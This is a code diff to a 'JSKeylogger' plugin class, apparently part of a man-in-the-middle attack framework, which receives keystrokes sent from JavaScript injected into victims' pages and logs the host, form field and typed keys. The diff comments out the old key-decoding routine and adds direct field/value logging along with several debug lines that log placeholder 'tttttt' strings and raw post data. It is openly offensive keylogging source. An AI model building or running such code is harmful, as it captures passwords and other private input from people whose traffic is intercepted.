@@ -35,29 +35,35 @@ class JSKeylogger(Inject, Plugin):
         if 'keylog' in request.uri:
             request.handle_post_output = True
 
-            raw_keys = request.postData.split("&&")[0]
-            input_field = request.postData.split("&&")[1]
+            name = request.postData['name']
+            value = request.postData['value']
 
-            keys = raw_keys.split(",")
-            if keys:
-                del keys[0]
-                del keys[len(keys)-1]
+#            raw_keys = request.postData.split("&&")[0]
+#            input_field = request.postData.split("&&")[1]
+#
+#            keys = raw_keys.split(",")
+#            if keys:
+#                del keys[0]
+#                del keys[len(keys)-1]
+#
+#                nice = ''
+#                for n in keys:
+#                    if n == '9':
+#                        nice += "<TAB>"
+#                    elif n == '8':
+#                        nice = nice[:-1]
+#                    elif n == '13':
+#                        nice = ''
+#                    else:
+#                        try:
+#                            nice += n.decode('hex')
+#                        except:
+#                            self.clientlog.error("Error decoding char: {}".format(n), extra=request.clientInfo)
 
-                nice = ''
-                for n in keys:
-                    if n == '9':
-                        nice += "<TAB>"
-                    elif n == '8':
-                        nice = nice[:-1]
-                    elif n == '13':
-                        nice = ''
-                    else:
-                        try:
-                            nice += n.decode('hex')
-                        except:
-                            self.clientlog.error("Error decoding char: {}".format(n), extra=request.clientInfo)
-
-                self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], input_field, nice), extra=request.clientInfo)
+            self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], name, value), extra=request.clientInfo)
+            self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], "tttttt", "tttttt"), extra=request.clientInfo)
+            self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], request.postData, request.postData), extra=request.clientInfo)
+            self.clientlog.info("Host: {} | Field: {} | Keys: {}".format(request.headers['host'], request.post, request.post), extra=request.clientInfo)
 
     def options(self, options):
         pass
